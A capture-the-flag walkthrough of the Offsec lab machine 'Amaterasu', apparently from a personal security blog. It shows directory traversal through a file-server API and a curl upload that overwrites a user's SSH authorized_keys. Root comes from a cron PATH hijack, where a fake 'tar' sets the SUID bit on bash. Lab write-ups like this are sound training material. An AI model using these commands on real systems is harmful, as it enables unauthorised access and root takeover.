---
title: "Offsec - PG Play - Easy - Amaterasu"
date: 2025-11-08 00:00:00 -0700
categories: [CTF, Offsec]
tags: [linux, webapp, path traversal, file upload, api, cron, suid]
---

![Amaterasu](/assets/img/ctf/offsec/easy/amaterasu/amaterasu.png))

# Initial Intel
* Difficulty: Easy
* OS: Linux

# tl;dr
<details><summary>Spoilers</summary>
* perform web discovery on the webserver at :33414
* utilize the API to discover the user and then leverage the other API function to overite their authorized SSH keys
* use linPEAS to identify a cron job that uses an interesting folder
* add a SUID bit to a file to launch bash as root
</details>

# Attack Path

## Recon

### Service Enumeration

Standard TCP scan to start:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/offsec/easy/Amaterasu]      
└─$ nmap_tcp_full $ama
...
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 61 vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
25022/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.6 (protocol 2.0)
33414/tcp open  unknown syn-ack ttl 61
    Server: Werkzeug/2.2.3 Python/3.9.13 
40080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.53 ((Fedora))  
    |_http-title: My test page
```

Notable services:

#### 21/TCP - FTP
Anonymous is allowed. Could not list dir contents. No exploits found for version 3.0.3. Moving on.

#### 25022/TCP - SSH
No exploits found for OpenSSH 8.6. Need to enumerate usernames/passwords first.

#### 33414/TCP - Unknown / Webserver

Navigating to the port in-browser shows this is a webserver.

![Webserver 33414/TCP](/assets/img/ctf/offsec/easy/amaterasu/1.png)

Performed some web discovery:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/offsec/easy/Amaterasu]
└─$ feroxbuster --url http://$ama:33414 --depth 3 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
...
200      GET        1l       14w       98c http://192.168.227.249:33414/info
200      GET        1l       19w      137c http://192.168.227.249:33414/help
```

Looks like we have an API we may be able to manipulate.

```bash
http://192.168.227.249:33414/info

["Python File Server REST API v2.5","Author: Alfredo Moroder","GET /help = List of the commands"]
```

```bash
http://192.168.227.249:33414/help

["GET /info : General Info","GET /help : This listing","GET /file-list?dir=/tmp : List of the files","POST /file-upload : Upload files"]
```

*GET /file-list?dir=/tmp* looks abusable, as does *POST /file-upload : Upload files*. I'll try to see if they are exploitable:

![GET /file-list?dir=/tmp](/assets/img/ctf/offsec/easy/amaterasu/2.png)

Nice. It looks like I can perform directory traversal and get some intel.

![/home directory](/assets/img/ctf/offsec/easy/amaterasu/3.png)

![/home/alfredo directory](/assets/img/ctf/offsec/easy/amaterasu/4.png)

There's a user *alfredo*. I'll add him to a *users.txt* file.

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/offsec/easy/Amaterasu]
└─$ echo "alfredo" > users.txt
```

I'll try to exploit the /file-upload function shortly.


#### 40080/TCP - Webserver

![Webserver 40080/TCP](/assets/img/ctf/offsec/easy/amaterasu/5.png)

Did web discovery here, seems to be nothing.


## Foothold

Going back to the POST /file-upload API function on 33414/TCP, I'll try to replace *alfredo*'s keys with my own.

I tried multiple upload formats via curl and burpsuite without success. I finally determined that uploading .pub files wasn't working, so I changed the upload filetype to .txt and was able to overwrite the *authorized_keys* file for *alfredo*.

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/offsec/easy/Amaterasu]
└─$ curl -v   -F "file=@/home/haunter/working/OpposingForce/haunter-actual.github.io/_posts/ctf/offsec/easy/Amaterasu/id_rsa.txt"   -F "filename=/home/alfredo/.ssh/authorized_keys"   "http://$ama:33414/file-upload"  
*   Trying 192.168.227.249:33414...
* Connected to 192.168.227.249 (192.168.227.249) port 33414
* using HTTP/1.x
> POST /file-upload HTTP/1.1
> Host: 192.168.227.249:33414
> User-Agent: curl/8.13.0-rc2
> Accept: */*
> Content-Length: 1070
> Content-Type: multipart/form-data; boundary=------------------------TA9AYTqZZ75S2pqGGO3Zdm
> 
* upload completely sent off: 1070 bytes
< HTTP/1.1 201 CREATED
< Server: Werkzeug/2.2.3 Python/3.9.13
< Date: Sat, 08 Nov 2025 20:05:30 GMT
< Content-Type: application/json
< Content-Length: 41
< Connection: close
< 
{"message":"File successfully uploaded"}
* shutting down connection #0
```

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/offsec/easy/Amaterasu]
└─$ ssh -i id_rsa alfredo@$ama -p 25022
```

![Webserver 40080/TCP](/assets/img/ctf/offsec/easy/amaterasu/6.png)

Got the local.txt flag.

## Lateral Movement / Privilege Escalation

I ran *suid3num* and *linPEAS* for potential privesc vectors:

![PrivEsc Tools](/assets/img/ctf/offsec/easy/amaterasu/7.png)

*linPEAS* showed a task that was running every minute. This script pointed to the *restapi* dir in */home/alfredo*. It runs as *root*. 
Cron script:

```bash
│*/1 * * * * root /usr/local/bin/backup-flask.sh
```

Contents:

```bar
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh 

#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

The script sets the PATH to /home/alfredo/restapi and then uses *tar*. Since this runs under *root context* and *I can edit stuff in /home/alfredo/restapi*, I should be able to create a new *tar* bin and use it to privEsc.

```bash
[alfredo@fedora ~]$ cd restapi/                                                                             
[alfredo@fedora restapi]$ echo '#!/bin/bash' > tar                                                  
[alfredo@fedora restapi]$ echo 'chmod u+s /bin/bash' >> tar                                             
[alfredo@fedora restapi]$ chmod +x tar          
```

Above shows that I've create a new file at */home/alfredo/restapi/tar*. The contents are run as *root* via the cronjob and set a SUID value for /bin/bash.

If we check for SUID files after a minute passes, we SHOULD see bash set with the SUID value:

## Root / SYSTEM

```bash
[alfredo@fedora restapi]$ find / root -perm -u=s -ls 2>/dev/null                                                                                                                                                    
25252326   1360 -rwsr-xr-x   1 root     root      1390080 Jan 25  2021 /usr/bin/bash  
```

So we should be able to launch bash as root...

```bash
[alfredo@fedora restapi]$ bash -p
bash-5.1# whoami
root
```

There we are. Amaterasu rooted.

# Lessons Learned
* Use curl to POST files if an API has a function
* Upload filetypes may be restricted. E.g., .pub files may not be allowed but can be uploaded as .txt and then saved to the target location as .pub
* set $attacker .pub keys to overwrite a user's authorized_keys file to be able to SSH
* check cron jobs for interesting run intervals
* if the cron is run as root, check to see what file(s) are being run. If our user can edit the file or directory, we can try to replace a bin being referenced
